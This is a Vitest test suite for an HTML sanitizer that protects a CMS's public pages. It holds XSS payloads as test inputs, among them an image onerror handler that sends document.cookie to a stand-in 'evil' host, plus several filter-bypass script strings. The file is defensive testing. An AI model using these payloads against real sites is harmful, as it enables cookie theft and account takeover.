import { describe, expect, it } from "vitest";
import { sanitizeHtml, isSafeHtml } from "../src/lib/content/sanitize";

/**
 * The admin CMS lets an authorised editor store raw HTML and the public site renders
 * it. This module is the only thing standing between an editor's input and the
 * browser, so it is tested as a security boundary, not as a formatting helper.
 */

describe("sanitizeHtml — script and handler removal", () => {
  it("removes script tags entirely", () => {
    expect(sanitizeHtml("<p>Hi</p><script>alert(1)</script>")).toBe("<p>Hi</p>");
  });

  it("removes event handler attributes", () => {
    expect(sanitizeHtml('<p onclick="steal()">Hi</p>')).toBe("<p>Hi</p>");
    expect(sanitizeHtml('<img src="x" onerror="alert(1)">')).toBe('<img src="x" alt="">');
    expect(sanitizeHtml('<a href="#" onmouseover="x()">y</a>')).toBe('<a href="#">y</a>');
  });

  it("removes javascript: URLs", () => {
    expect(sanitizeHtml('<a href="javascript:alert(1)">x</a>')).toBe("<a>x</a>");
    expect(sanitizeHtml('<a href="JaVaScRiPt:alert(1)">x</a>')).toBe("<a>x</a>");
  });

  it("removes data: URLs except images", () => {
    expect(sanitizeHtml('<a href="data:text/html,<script>x</script>">x</a>')).toBe("<a>x</a>");
    expect(sanitizeHtml('<img src="data:image/png;base64,AAAA" alt="a">')).toContain("<img");
  });

  it("removes style attributes to prevent CSS injection", () => {
    expect(sanitizeHtml('<p style="position:fixed;top:0">x</p>')).toBe("<p>x</p>");
  });

  it("removes iframe, object, embed and form elements", () => {
    expect(sanitizeHtml("<iframe src='https://evil'></iframe><p>x</p>")).toBe("<p>x</p>");
    expect(sanitizeHtml("<object data='x'></object><p>y</p>")).toBe("<p>y</p>");
    expect(sanitizeHtml("<embed src='x'><p>z</p>")).toBe("<p>z</p>");
    // A form and everything inside it are removed together, then content after it
    // survives. This is why DROP_WITH_CONTENT must only contain non-void elements.
    expect(sanitizeHtml("<form action='https://evil'><p>w</p></form><p>after</p>")).toBe("<p>after</p>");
    expect(sanitizeHtml("<form action='https://evil'><p>w</p></form>")).toBe("");
  });

  it("removes meta refresh and base tags", () => {
    expect(sanitizeHtml('<meta http-equiv="refresh" content="0;url=https://evil"><p>x</p>')).toBe(
      "<p>x</p>",
    );
    expect(sanitizeHtml('<base href="https://evil"><p>y</p>')).toBe("<p>y</p>");
  });

  it("neutralises SVG and MathML", () => {
    expect(sanitizeHtml("<svg><script>x</script></svg><p>y</p>")).toBe("<p>y</p>");
    expect(sanitizeHtml("<math><mtext><script>x</script></mtext></math><p>z</p>")).toBe("<p>z</p>");
  });

  it("drops dangerous attributes on allowed tags", () => {
    expect(sanitizeHtml('<a href="https://example.com" target="_blank" rel="noopener">x</a>')).toContain(
      'target="_blank"',
    );
    expect(sanitizeHtml('<div class="x" id="y">z</div>')).toBe('<div class="x" id="y">z</div>');
  });
});

describe("sanitizeHtml — preserves the editor's formatting subset", () => {
  it("keeps headings, paragraphs, lists, emphasis and links", () => {
    const input =
      "<h2>Title</h2><p>Text with <strong>bold</strong> and <em>italic</em>.</p><ul><li>one</li><li>two</li></ul>";
    const output = sanitizeHtml(input);
    expect(output).toContain("<h2>Title</h2>");
    expect(output).toContain("<strong>bold</strong>");
    expect(output).toContain("<em>italic</em>");
    expect(output).toContain("<ul><li>one</li><li>two</li></ul>");
  });

  it("keeps images with a src and alt", () => {
    const output = sanitizeHtml('<img src="https://cdn.example.com/a.jpg" alt="A lake">');
    expect(output).toContain("https://cdn.example.com/a.jpg");
    expect(output).toContain('alt="A lake"');
  });

  it("keeps external links with https only", () => {
    expect(sanitizeHtml('<a href="https://example.com">x</a>')).toContain("https://example.com");
    expect(sanitizeHtml('<a href="http://example.com">x</a>')).toContain("http://example.com");
    expect(sanitizeHtml('<a href="ftp://example.com">x</a>')).not.toContain("ftp://");
  });

  it("keeps tables", () => {
    const output = sanitizeHtml("<table><thead><tr><th>A</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>");
    expect(output).toContain("<table>");
    expect(output).toContain("<th>A</th>");
  });

  it("returns empty string for empty input", () => {
    expect(sanitizeHtml("")).toBe("");
  });

  it("is idempotent", () => {
    const once = sanitizeHtml('<p onclick="x">hi</p><script>y</script>');
    expect(sanitizeHtml(once)).toBe(once);
  });
});

describe("isSafeHtml", () => {
  it("reports whether input would change", () => {
    expect(isSafeHtml("<p>safe</p>")).toBe(true);
    expect(isSafeHtml("<script>alert(1)</script>")).toBe(false);
    expect(isSafeHtml('<img src="x" onerror="alert(1)">')).toBe(false);
  });
});

describe("sanitizeHtml — realistic attack payloads", () => {
  const payloads = [
    '<img src=x onerror="fetch(\'https://evil/\'+document.cookie)">',
    '<svg onload="alert(1)">',
    '<a href="javascript:alert(document.domain)">click</a>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<<script>script>alert(1)<</script>/script>',
    '<div style="background-image:url(javascript:alert(1))">x</div>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<form action="https://evil"><input name="p"></form>',
    '<object type="text/x-scriptlet" data="https://evil/x"></object>',
    '<link rel="stylesheet" href="https://evil/x.css">',
  ];

  it.each(payloads)("neutralises %s", (payload) => {
    const out = sanitizeHtml(payload);
    expect(out.toLowerCase()).not.toContain("<script");
    expect(out.toLowerCase()).not.toContain("onerror=");
    expect(out.toLowerCase()).not.toContain("onload=");
    expect(out.toLowerCase()).not.toContain("javascript:");
    expect(out.toLowerCase()).not.toContain("<iframe");
    expect(out.toLowerCase()).not.toContain("<object");
    expect(out.toLowerCase()).not.toContain("<form");
    expect(out.toLowerCase()).not.toContain("<link");
  });
});
